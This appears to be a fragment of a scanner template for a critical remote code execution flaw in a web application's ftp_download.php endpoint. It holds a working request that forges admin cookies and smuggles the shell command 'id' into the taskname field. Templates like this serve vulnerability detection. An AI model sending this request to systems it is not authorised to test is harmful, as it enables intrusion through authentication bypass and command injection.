  severity: critical
  description: ''
  tags: rce,2025
http:
- raw:
  - 'POST /web/addons/ftp_download.php HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14816.131.5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36

    Connection: keep-alive

    Content-Length: 29

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    Cookie: isAdmin=1; username=admin;

    Accept-Encoding: gzip, deflate, br


    action=create&taskname='';id;'''
  redirects: false
  matchers:
  - status:
    - 200
    type: status
